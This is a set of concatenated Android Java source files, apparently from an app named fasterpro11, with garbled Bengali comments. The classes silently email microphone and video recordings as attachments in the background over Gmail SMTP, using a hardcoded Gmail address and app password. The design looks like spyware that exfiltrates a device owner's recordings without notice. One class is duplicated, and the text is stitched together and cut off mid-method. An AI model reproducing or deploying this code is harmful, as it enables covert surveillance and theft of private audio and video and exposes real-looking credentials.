import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨

public class JavaMailAPI_MicRecord_Sender {
    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥

    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
    public JavaMailAPI_MicRecord_Sender(String email, String subject, String message, String filePath) {
        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
    }

    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
    public void sendMail() {
        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
    }

    private class SendMailTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                if (!CountEmail.canSendEmail()) {
                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                }

                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾

                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                    }
                });

                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                MimeMessage mimeMessage = new MimeMessage(session);
                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                Multipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾

                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                if (filePath != null && !filePath.isEmpty()) {
                    try {
                        MimeBodyPart attachmentPart = new MimeBodyPart();
                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                    } catch (Exception e) {
                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                        e.printStackTrace();
                    }
                }

                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                try {
                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                } catch (MessagingException e) {
                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                    e.printStackTrace();
                }
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
            }
            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
        }
    }

    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
    public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
        try {
            JavaMailAPI_MicRecord_Sender javaMailAPI = new JavaMailAPI_MicRecord_Sender(email, subject, message, filePath);
            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
        } catch (Exception e) {
            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
            e.printStackTrace();
        }
    }
}



//JavaMailAPI_MicRecord_Sender .java
package com.example.fasterpro11;

import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯

import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨

public class JavaMailAPI_MicRecord_Sender {
    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥

    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
    public JavaMailAPI_MicRecord_Sender(String email, String subject, String message, String filePath) {
        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
    }

    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
    public void sendMail() {
        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
    }

    private class SendMailTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                if (!CountEmail.canSendEmail()) {
                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                }

                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾

                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                    }
                });

                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                MimeMessage mimeMessage = new MimeMessage(session);
                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                Multipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾

                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                if (filePath != null && !filePath.isEmpty()) {
                    try {
                        MimeBodyPart attachmentPart = new MimeBodyPart();
                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                    } catch (Exception e) {
                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                        e.printStackTrace();
                    }
                }

                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                try {
                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                } catch (MessagingException e) {
                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                    e.printStackTrace();
                }
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
            }
            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
        }
    }

    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
    public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
        try {
            JavaMailAPI_MicRecord_Sender javaMailAPI = new JavaMailAPI_MicRecord_Sender(email, subject, message, filePath);
            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
        } catch (Exception e) {
            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
            e.printStackTrace();
        }
    }
}



//JavaMailAPI_VideoRecord_Sender.java
package com.example.fasterpro11;

import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯

import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨

public class JavaMailAPI_VideoRecord_Sender {
    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥

    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
    public JavaMailAPI_VideoRecord_Sender(String email, String subject, String message, String filePath) {
        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
    }

    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
    public void sendMail() {
        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
    }

    private class SendMailTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
            if (!CountEmail.canSendEmail()) {
                Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
            }

            // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
            Properties props = new Properties();
            props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
            props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
            props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
            props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾

            final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
            final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

            // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
            Session session = null;
            try {
                session = Session.getInstance(props, new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Error occurred while creating session: " + e.getMessage(), e); // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
                return null; // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦¬à§à¦¯à¦°à§à¦¥ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
            }

            try {
                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                MimeMessage mimeMessage = new MimeMessage(session);
                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                Multipart multipart = new MimeMultipart();
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾

                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                if (filePath != null && !filePath.isEmpty()) {
                    try {
                        MimeBodyPart attachmentPart = new MimeBodyPart();
                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                    } catch (Exception e) {
                        Log.e(TAG, "Error occurred while attaching the file: " + e.getMessage(), e); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿
                        e.printStackTrace();
                        return null; // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦š à¦•à¦°à¦¤à§‡ à¦¸à¦®à¦¸à§à¦¯à¦¾ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
                    }
                }

                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

                try {
                    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                    Transport.send(mimeMessage);
                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                    Log.d(TAG, "VideoRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                } catch (MessagingException e) {
                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage(), e); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                    e.printStackTrace();
                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¬à§à¦¯à¦°à§à¦¥ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
                }

            } catch (Exception e) {
                Log.e(TAG, "Error occurred during mail creation or sending: " + e.getMessage(), e); // à¦®à§‡à¦‡à¦² à¦¤à§ˆà¦°à¦¿ à¦¬à¦¾ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                e.printStackTrace();
            }
            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
        }
    }

    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
    public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
